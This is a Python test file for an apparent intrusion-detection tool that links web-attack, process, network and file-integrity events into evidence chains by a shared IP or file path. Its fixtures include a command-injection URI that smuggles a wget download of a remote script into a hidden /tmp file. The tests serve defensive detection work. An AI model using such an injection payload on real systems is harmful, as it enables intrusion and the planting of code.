from aegis_agent.evidence.builder import build_evidence_chains
from aegis_agent.models import Event


def test_unrelated_suspicious_process_is_not_added_to_ip_chain():
    web = Event(
        "E1", 1000.0, "access.log", "web_attack_pattern", "host", "high", "attack",
        src_ip="203.0.113.50", uri="/api?cmd=wget%20http://45.77.1.2/x.sh", metadata={"embedded_ip": "45.77.1.2", "patterns": ["command_injection"]}
    )
    unrelated = Event(
        "E2", 1001.0, "process_snapshot", "suspicious_process", "host", "high", "9999 user shell",
        process="9999 1 user bash /home/user/script.sh", pid=9999, metadata={"pid": 9999, "ppid": 1}
    )
    chains = build_evidence_chains([web, unrelated])
    assert len(chains) == 1
    ids = [e.event_id for e in chains[0].events]
    assert "E1" in ids
    assert "E2" not in ids


def test_related_process_network_file_are_added_by_shared_c2_and_file_path():
    web = Event(
        "E1", 1000.0, "access.log", "web_attack_pattern", "host", "high", "attack",
        src_ip="203.0.113.50", uri="/api?cmd=wget%20http://45.77.1.2/x.sh%20-O%20/tmp/.x",
        metadata={"embedded_ip": "45.77.1.2", "embedded_file_path": "/tmp/.x", "patterns": ["command_injection"]}
    )
    proc = Event(
        "E2", 1003.0, "process_snapshot", "suspicious_process", "host", "high", "3333 sh wget http://45.77.1.2/x.sh -O /tmp/.x",
        dst_ip="45.77.1.2", file_path="/tmp/.x", process="3333 sh wget http://45.77.1.2/x.sh -O /tmp/.x", pid=3333, metadata={"pid": 3333, "ppid": 2222}
    )
    net = Event(
        "E3", 1004.0, "network_snapshot", "external_network_connection", "host", "high", "tcp ESTAB ... 45.77.1.2:443 pid=3333",
        dst_ip="45.77.1.2", pid=3333, metadata={"pid": 3333}
    )
    file_ev = Event("E4", 1005.0, "fim_poll", "suspicious_file", "host", "high", "FIM CREATE /tmp/.x", file_path="/tmp/.x")
    chains = build_evidence_chains([web, proc, net, file_ev])
    ids = [e.event_id for e in chains[0].events]
    assert ids == ["E1", "E2", "E3", "E4"]
    rels = {e.event_id: e.metadata.get("chain_relation") for e in chains[0].events}
    assert rels["E2"] in {"shared_external_destination_ip", "shared_file_path", "textual_target_match"}
